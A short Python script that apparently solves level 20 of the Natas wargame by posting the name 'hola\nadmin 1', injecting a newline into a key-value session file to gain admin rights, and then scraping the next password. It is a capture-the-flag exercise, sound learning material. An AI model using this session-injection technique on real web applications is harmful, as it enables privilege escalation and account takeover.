import re
from src.natas.base_level import NatasLevel

class Level_20(NatasLevel):

  num = 20
  explanation = "On this level, the session is stored as newline-separated key-value pairs.\n     We inject a newline into the name to add `admin 1` to the session and gain admin privileges."

  def exploit(self) -> str:

    resp      = self.session.get(self.base_url + "/index.php")
    self.session.post(self.base_url + "/index.php",data={"name": "hola\nadmin 1"})
    resp_pass = self.session.get(self.base_url + "/index.php")
    match     = re.search(r'Password: (.*)[a-zA-Z0-9]', resp_pass.text).group().replace("Password:", "").replace("</pre", "").strip()

    return match
